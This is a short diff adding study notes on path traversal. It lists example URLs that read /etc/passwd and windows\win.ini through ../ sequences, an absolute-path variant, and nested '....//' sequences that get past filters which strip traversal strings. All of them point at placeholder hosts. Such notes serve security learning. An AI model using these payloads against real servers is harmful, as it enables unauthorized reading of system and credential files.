@@ -1,0 +1,13 @@
+<img src="/loadImage?filename=218.png">
+Location: /var/www/images/
+Attack: https://insecure-website.com/loadImage?filename=../../../etc/passwd
+Windows: https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
+
+Absolute path:
+https://example.com/image?filename=/etc/passwd
+
+Nested traversal sequences:
+....//
+....\/
+revert to simple traversal sequences when the inner sequence is stripped
+https://example.com/image?filename=....//....//....//etc/passwd
